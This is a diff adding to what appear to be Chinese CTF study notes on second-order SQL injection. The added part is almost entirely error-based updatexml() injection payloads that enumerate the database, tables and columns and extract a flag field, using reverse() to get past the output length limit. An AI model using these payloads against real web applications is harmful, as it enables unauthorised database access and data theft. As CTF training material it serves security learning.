@@ -95,3 +95,17 @@ print("All:", column)
 往往可以注册，先把payload注入数据库，
 再在另一个页面，如查询详细资料，修改信息提交前等，会查询出来并二次直接查询数据库，造成二次注入。
 一般是报错回显。
+```
+123"||(updatexml(1,concat('~',(select(database()))),1))#
+
+123"||(updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema='web_sqli'))),1))#
+
+123"||(updatexml(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag'))),1))#
+
+123"||(updatexml(1,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),1))#
+
+123"||(updatexml(1,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')),1))#
+
+updatexml()函数有长度限制（32位），使用reverse()进行倒序输出，将其与前段的flag进行拼接得到flag
+123"||(updatexml(1,concat('~',reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1))#
+```
